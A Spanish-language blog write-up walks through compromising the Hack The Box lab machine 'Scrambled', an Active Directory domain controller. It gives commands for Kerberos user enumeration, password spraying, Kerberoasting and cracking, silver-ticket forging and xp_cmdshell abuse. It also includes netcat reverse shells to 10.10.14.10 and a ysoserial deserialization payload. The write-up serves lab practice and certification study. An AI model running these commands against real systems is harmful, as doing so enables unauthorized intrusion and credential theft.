---
layout: post
title: "Write Up Scrambled."
subtitle: "Starting-Point"
category: Blog
tags: [Medium,Windows,Ldap,SMB,Cracking,Hashes,Ysoserial,ASREPRoasting,BloodHound,RCE,RCP,EvilWinRM,SMB,Active-Directory,Network,Vulnerability-Assessment,Active-Directory,Source-Code-Analysis,Reversing,IIS,NET,Kerberos,WinRM,MSSQL,dnspy,Impacket,Python,SQL,C#,Configuration-Analysis,Binary-Analysis,Password-Cracking,Kerberoasting,Kerberos-Abuse,Decompilation,Clear-Text-Credentials,Deserialization,Information-Disclosure,Default-Credentials,Misconfiguration,Sensitive-Data-Exposure,OSCP,OSEP,eWPTxv2]
image:
  path: /assets/img/scrambled/Captura%20de%20pantalla%20(200).png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.11.168 -oG allports
```


### Services and Versions


```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49669,49670,49686,49690,54769 10.10.11.168 -oN target
```

![list](/assets/img/scrambled/Kali-2022-09-06-13-51-23.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis and Explotation


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros, con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler`  probamos crackmapexec , smbclient y smbmap ,etc y nada por lo visto por ahi no va la resolucion de la maquina e investigamos el servicio http que corre en el pueto 80, podemos usar `wapalizzer` para ver que tecnologias usa la pagina asi como desde el terminal `whatweb` al hacer `crtl+ u` no encontramos nada. 


![list](/assets/img/scrambled/Kali-2022-09-06-13-47-25.png){:.lead width="800" height="100" loading="lazy"}


Del escaneo de versiones encontramos el nombre del equipo y el dominio DC1.scrm.local y lo metemos en el /etc/host.


Enumerando la web nos encontramos algunos usuarios loas vamos a  guardar en un archivo usernames.txt  que luego vamos a validar con kerbrute ya que tenemos el puerto 88 abierto.


![list](/assets/img/scrambled/Kali-2022-09-06-13-48-17.png){:.lead width="800" height="100" loading="lazy"}


```bash
kerbrute userenum -d scrm.local --dc dc1.scrm.local usernames.txt
```


{:.note}
Los usuarios validos son `ASMITH@scrm.local`,`KSIMPSON@scrm.local`,`SJENKINS@scrm.local`,`JHALL@scrm.local`,`KHICKS@scrm.local`.


Obtenemos algunos usuarios validos, de ellos ksimpson usa su usuario como contraseña.


```bash
kerbrute passwordspray -d scrm.local --dc dc1.scrm.local users.txt ksimpson
```


{:.note}
La contraseña es valida para el usuario`KSIMPSON@scrm.local`.


Nos aseguramos con crackmapexec ya que es una mala practica reutilizar el usuario en la contraseña.


```bash
crackmapexec smb 10.10.11.168 -u KSIMPSON@scrm.local -p 'ksimpson'
```


{:.note}
Con estas credenciales solicitaremos un ticket para después autenticarnos con kerberos.


Tratamos de ver si podemos ejecutar la vunnerabilidad de ASROAST Attack pero no podemos asi que vamos a probar otras cosas.


```bash
GetNPUsers.py scrm.local/ksimpson:ksimpson 
```


Tambien tratamos de ejecutar la vulnerabilidad kerberoasting Attack pero no podemos asi que vamos a probar otras cosas.


```bash
GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass
```


{:.note}
Vemos el hash  que guardamos en archivo llamado hash.


Intentaremos crackear y tambien debemos estar sicronizados con la maquina victima en funcion de la hora.


```bash
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```


{:.note}
La contraseña es `Pegasus60`.


Ya que tenemos la contraseña vamos  a solicitar un ticket granting ticket,


```bash
getTGT.py scrm.local/sqlsvc:Pegasus60
```


{:.note}
Debemos exportar la variable de entorno.


```bash
export KRB5CCNAME=sqlsvc.ccache
```


{:.note}
Y ahora con mssqlclient.py.


```bash
impacket-mssqlclient dc1.scrm.local -k -no-pass
```


{:.note}
Pero no funciona.


Con secretsdump en modo debug podemos obtener el sid del dominio.


```bash
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
```


{:.note}
El SID es `S-1-5-21-2743207045-1827831105-2542523200-500`.


Con ayuda de [codebeautify] podemos convertir la contraseña a un hash ntlm.


[codebeautify](https://codebeautify.org/ntlm-hash-generator)


![list](/assets/img/scrambled/Kali-2022-09-06-14-47-04.png){:.lead width="800" height="100" loading="lazy"}


Podemos obtener un ticket con la información que tenemos esta vez para el usuario sqlsvc


```bash
impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200
```


Con este ticket podemos autenticarnos a sql con mssqlclient.


```bash
export KRB5CCNAME=Administrator.ccache
```


{:.note}
Ahora probamos con `Administrator`.



```bash
impacket-mssqlclient dc1.scrm.local -k -no-pass
```


{:.note}
Y nos conectamos al servicio de microsoft SQL.


![list](/assets/img/scrambled/Kali-2022-09-06-14-51-24.png){:.lead width="800" height="100" loading="lazy"}


Mirando el contenido de la base de datos nos conectamos a `ScrambleHR` y ejecutamos los siguientes comandos para ejecutar un comado.


```bash
use ScrambleHR
```


```bash
select * from UserImport
```


{:.note}
El usuario es `MiscSvc` la pass `ScrambledEggs9900`  y el `scrm.local` es el dominio.


```bash
enable_xp_cmdshell
```



```bash
xp_cmdshell whoami
```


Ahora podemos compartir y traer netcat de nuestro equipo para obtener una powershell.



```bash
xp_cmdshell curl 10.10.14.10/netcat.exe -o C:\Temp\netcat.exe
```


Debemos de una ves traernos el netcat.


```bash
xp_cmdshell C:\Temp\netcat.exe -e powershell 10.10.14.10 443
```


Nos ejecutamos una reverse-shel y nos ponemos a la escucha netcat  `nc -lvnp 443`.


Con powershell podemos usar las credenciales que encontramos antes para ejecutar comandos que son para pivotiar del usuario `sqlsvc` a `MiscSvc`.


```powershell
$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
```


```powershell
$Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
```


```powershell
Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }
```


Ahora podemos enviarnos una powershell y conseguir la flag del usuario.


```powershell
Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\Temp\netcat.exe -e powershell 10.10.14.10 443 }
```


{:.note}
Nos ponemos a la escucha con netcat `nc -lvnp 443`.


```powershell
type ..\Desktop\user.txt
```


{:.note}
Ya vemos la flag


![list](/assets/img/scrambled/Kali-2022-09-06-15-15-24.png){:.lead width="800" height="100" loading="lazy"}


## Escalation Privileges


Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles vectores para escalar de privilegios.


Encontramos un directorio con un ScrambleLib.dll y un ScrambleClient, y parece que es lo que corre en el puerto 4411.


![list](/assets/img/scrambled/Kali-2022-09-06-15-18-54.png){:.lead width="800" height="100" loading="lazy"}


Encontramos en la funcion UploadOrder una deserialización que podemos explotar, con ayuda de [ysoserial] en un windows crearemos una data que nos envie una powershell.


[ysoserial](https://github.com/pwntester/ysoserial.net)


```powershell
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.10 443"
```


El servidor nos responde con un ouput que debemos que aplicarle un tratamiento a este lo guardamos en un archivo.


```powershell
netcat 10.10.11.168 4411
```


{:.note}
Tratamos de entabalr un aconecion con la maquina victima pero el output le borramos la cabecera que nos dio el server y le ponemos `UPLOAD_ORDER` y lo enviamos porsupuesto debemos estar a  la escucha con netcat `nc -lvnp 443`.


{:.note}
Con el comando `type C:\Users\Administrator\Desktop\root.txt` ya vemos la flag de root.

***
```bash
🎉 Felicitaciones ya has comprometido Scrambled de Hack The Box. 🎉
```
{:.centered}
***
Back to [Certification eWJPTXv2](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSEP](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSCP](){:.heading.flip-title}
{:.read-more}